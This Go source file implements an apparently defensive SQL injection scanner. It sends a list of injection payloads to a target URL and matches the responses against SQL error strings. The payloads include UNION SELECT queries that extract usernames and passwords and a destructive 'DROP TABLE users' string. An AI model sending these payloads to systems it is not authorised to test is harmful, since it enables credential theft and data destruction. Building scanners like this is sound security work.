package scanner

import (
	"fmt"
	"time"
	"strings"
)

// SQLInjectionScanner implements the VulnerabilityScanner interface for detecting SQL Injection vulnerabilities.
type SQLInjectionScanner struct{}

// Scan performs the SQL Injection scan on the provided target and returns VulnerabilityDetails if detected.
func (s *SQLInjectionScanner) Scan(target string, headers map[string]string) (VulnerabilityDetails, bool) {
	// SQL Injection payloads to test
	sqlPayloads := []string{
		"' OR '1'='1",
		"' OR '1'='0'--",
		"'; DROP TABLE users--",
		"' AND 1=1",
		"1' OR 1=1--",
		"1' UNION SELECT NULL, username, password FROM users--",
		"' UNION ALL SELECT NULL, NULL, NULL--",
		"' AND (SELECT COUNT(*) FROM information_schema.tables) > 1--",
		"1' AND 1=2 UNION ALL SELECT NULL, NULL, NULL--",
	}

	// Iterate over SQL payloads to check for anomalies
	for _, payload := range sqlPayloads {
		injectedURL := target + "?input=" + payload
		injectedResponse, err := sendRequest(injectedURL, headers)
		if err != nil {
			fmt.Println("Error sending request with payload:", payload, "Error:", err)
			continue
		}

		// Check if response contains SQL error messages
		if responseIndicatesVulnerability(injectedResponse) {
			fmt.Printf("SQL Injection vulnerability found at: %s with payload: %s\n", injectedURL, payload)
			
			vulnerability := VulnerabilityDetails{
				Type:       "SQL Injection",
				Endpoint:   injectedURL,
				Payload:    payload,
				DetectedAt: time.Now(),
				Suggestion: "Sanitize and parameterize SQL queries to prevent injection attacks.",
			}

			// Add vulnerability to the global slice
			AddVulnerability(vulnerability)

			return vulnerability, true
		}
	}

	// No vulnerability detected
	return VulnerabilityDetails{}, false
}

// Helper function to determine if response indicates a SQL Injection vulnerability
func responseIndicatesVulnerability(response string) bool {
	// Define SQL error patterns
	sqlErrorPatterns := []string{
		"SQL syntax error", "MySQL syntax error", "unclosed quotation mark",
		"SQL error", "you have an error in your SQL syntax", "Warning: mysqli",
	}

	// Check for SQL error patterns in the response
	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	return false
}